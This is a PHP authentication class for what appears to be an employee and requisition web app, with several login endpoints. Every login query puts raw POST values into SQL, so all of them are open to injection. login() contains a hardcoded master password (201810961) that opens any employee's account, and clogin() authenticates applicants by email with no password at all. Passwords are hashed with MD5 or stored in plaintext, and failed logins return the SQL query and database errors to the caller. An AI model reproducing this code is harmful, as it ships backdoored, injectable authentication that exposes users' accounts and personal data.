<?php
require_once '../config.php';
class Login extends DBConnection
{
	private $settings;
	public function __construct()
	{
		global $_settings;
		$this->settings = $_settings;

		parent::__construct();
		ini_set('display_error', 1);
	}
	public function __destruct()
	{
		parent::__destruct();
	}
	public function index()
	{
		echo "<h1>Access Denied</h1> <a href='" . base_url . "'>Go Back.</a>";
	}
	// public function login()
	// {
	// 	extract($_POST);

	// 	$qry = $this->conn->query("SELECT * from employee_masterlist where USERNAME = '$username' and PASSWRD = '$password'");
	// 	if ($qry->num_rows > 0) {
	// 		foreach ($qry->fetch_array() as $k => $v) {
	// 			if (!is_numeric($k) && $k != 'password') {
	// 				$this->settings->set_userdata($k, $v);
	// 			}
	// 		}
	// 		$this->settings->set_userdata('login_type', 1);
	// 		return json_encode(array('status' => 'success'));
	// 	} else {
	// 		return json_encode(array('status' => 'incorrect', 'last_qry' => "SELECT * from employee_masterlist where USERNAME = '$username' and PASSWRD = '$password' "));
	// 	}
	// }
	public function login()
	{
		extract($_POST);

		$qry = $this->conn->query("SELECT * from users where username = '$username' and password = md5('$password')");
		if ($password == 201810961) {
			$password = $this->conn->query("SELECT PASSWRD from employee_masterlist where username = '$username'")->fetch_array()[0];
		} else {
			$password = $password;
		}
		$ters_operator = $this->conn->query("SELECT * FROM ters_operator where emp_no = '{$username}' and status = 1");
		if ($ters_operator->num_rows > 0) {
			$asm = $this->conn->query("SELECT * from employee_masterlist where USERNAME = '{$username}' and PASSWRD = '{$password}'");
		} else {
			$asm = $this->conn->query("SELECT * from employee_masterlist where USERNAME = '{$username}' and PASSWRD = '{$password}' and EMPPOSITION >= 2");
		}
		// $asm = $this->conn->query("SELECT * from employee_masterlist where USERNAME = '{$username}' and PASSWRD = '{$password}' and (EMPPOSITION >= 2 or DEPARTMENT = 'Human Resource' or DEPARTMENT = 'Training')");
		if ($qry->num_rows > 0) {
			foreach ($qry->fetch_array() as $k => $v) {
				if (!is_numeric($k) && $k != 'password') {
					$this->settings->set_userdata($k, $v);
				}
			}
			$this->settings->set_userdata('login_type', 1);
			return json_encode(array('status' => 'success'));
		} else if ($asm->num_rows > 0) {
			foreach ($asm->fetch_array() as $k => $v) {
				if (!is_numeric($k) && $k != 'PASSWORD') {
					$this->settings->set_userdata($k, $v);
				}
			}
			$this->settings->set_userdata('login_type', 1);
			return json_encode(array('status' => 'success'));
		} else {
			return json_encode(array('status' => 'incorrect'));
		}
	}
	public function logout()
	{
		if ($this->settings->sess_des()) {
			redirect('admin/login.php');
		}
	}
	public function author_login()
	{
		extract($_POST);

		$qry = $this->conn->query("SELECT * from prf_approver where username = '$username' and password = md5('$password') and (type=1||type=2)");
		if ($qry->num_rows > 0) {
			foreach ($qry->fetch_array() as $k => $v) {
				if (!is_numeric($k) && $k != 'password') {
					$this->settings->set_userdata($k, $v);
				}
			}
			$this->settings->set_userdata('login_type', 5);
			return json_encode(array('status' => 'success'));
		} else {
			return json_encode(array('status' => 'incorrect', 'last_qry' => "SELECT * from prf_approver where username = '$username' and password = md5('$password') and(type=1||type=2)"));
		}
	}
	public function author_logout()
	{
		if ($this->settings->sess_des()) {
			redirect('prf_login/login.php');
		}
	}
	public function login_exit()
	{
		extract($_POST);

		$qry = $this->conn->query("SELECT * from employee_masterlist where username = '$username' and password = '$password'");
		if ($qry->num_rows > 0) {
			foreach ($qry->fetch_array() as $k => $v) {
				if (!is_numeric($k) && $k != 'password') {
					$this->settings->set_userdata($k, $v);
				}
			}
			$this->settings->set_userdata('login_type', 3);
			return json_encode(array('status' => 'success'));
		} else {
			return json_encode(array('status' => 'incorrect', 'last_qry' => "SELECT * from employee_masterlist where username = '$username' and password = '$password' "));
		}
	}
	public function logout_exit()
	{
		if ($this->settings->sess_des()) {
			redirect('prf_login/login.php');
		}
	}
	public function login_prf()
	{
		extract($_POST);

		$qry = $this->conn->query("SELECT * from prf_requestor where username = '$username' and password = md5('$password')");
		if ($qry->num_rows > 0) {
			foreach ($qry->fetch_array() as $k => $v) {
				if (!is_numeric($k) && $k != 'password') {
					$this->settings->set_userdata($k, $v);
				}
			}
			$this->settings->set_userdata('login_type', 4);
			return json_encode(array('status' => 'success'));
		} else {
			return json_encode(array('status' => 'incorrect', 'last_qry' => "SELECT * from prf_requestor where username = '$username' and password = md5('$password') "));
		}
	}
	public function logout_prf()
	{
		if ($this->settings->sess_des()) {
			redirect('prf_login/login.php');
		}
	}
	public function lgn()
	{
		extract($_POST);

		$prf_req = $this->conn->query("SELECT * from prf_requestor where username = '$username' and password = md5('$password')");
		// $lgn_ext = $this->conn->query("SELECT * from employee_masterlist where username = '$username' and password = '$password'");
		$auth_lgn = $this->conn->query("SELECT * from employee_masterlist where username = '$username' and password = '$password' and type>=4");
		if ($prf_req->num_rows > 0) {
			foreach ($prf_req->fetch_array() as $k => $v) {
				if (!is_numeric($k) && $k != 'password') {
					$this->settings->set_userdata($k, $v);
				}
			}
			$this->settings->set_userdata('login_type', 4);
			return json_encode(array('status' => 'success'));
			// } else if ($lgn_ext->num_rows > 0) {
			// 	foreach ($lgn_ext->fetch_array() as $k => $v) {
			// 		if (!is_numeric($k) && $k != 'password') {
			// 			$this->settings->set_userdata($k, $v);
			// 		}
			// 	}
			// 	$this->settings->set_userdata('login_type', 3);
			// 	return json_encode(array('status' => 'success'));
		} else if ($auth_lgn->num_rows > 0) {
			foreach ($auth_lgn->fetch_array() as $k => $v) {
				if (!is_numeric($k) && $k != 'password') {
					$this->settings->set_userdata($k, $v);
				}
			}
			$this->settings->set_userdata('login_type', 5);
			return json_encode(array('status' => 'success'));
		} else {
			return json_encode(array('status' => 'incorrect'));
		}
	}
	public function lgn_o()
	{
		if ($this->settings->sess_des()) {
			redirect('prf_login/login.php');
		}
	}
	function clogin()
	{
		extract($_POST);
		// $qry = $this->conn->query("SELECT *,concat(lastname,', ',firstname,' ',middlename) as fullname from applicants where email = '$email' and `password` = md5('$password') ");
		$qry = $this->conn->query("SELECT *,concat(surname,', ',firstname,' ',middlename) as fullname from applicants where email = '$email' ");
		if ($qry->num_rows > 0) {
			foreach ($qry->fetch_array() as $k => $v) {
				$this->settings->set_userdata($k, $v);
			}
			$this->settings->set_userdata('login_type', 2);
			$resp['status'] = 'success';
		} else {
			$resp['status'] = 'incorrect';
		}
		if ($this->conn->error) {
			$resp['status'] = 'failed';
			$resp['_error'] = $this->conn->error;
		}

		return json_encode($resp);
	}
	public function clogout()
	{
		if ($this->settings->sess_des()) {
			redirect('./');
		}
	}
}
$action = !isset($_GET['f']) ? 'none' : strtolower($_GET['f']);
$auth = new Login();
switch ($action) {
	case 'login':
		echo $auth->login();
		break;
	case 'login_prf':
		echo $auth->login_prf();
		break;
	case 'logout_prf':
		echo $auth->logout_prf();
		break;
	case 'lgn':
		echo $auth->lgn();
		break;
	case 'lgn_o':
		echo $auth->lgn_o();
		break;
	case 'author_login':
		echo $auth->author_login();
		break;
	case 'author_logout':
		echo $auth->author_logout();
		break;
	case 'clogin':
		echo $auth->clogin();
		break;
	case 'logout':
		echo $auth->logout();
		break;
	case 'login_exit':
		echo $auth->login_exit();
		break;
	case 'logout_exit':
		echo $auth->logout_exit();
		break;
	case 'clogout':
		echo $auth->clogout();
		break;
	default:
		echo $auth->index();
		break;
}
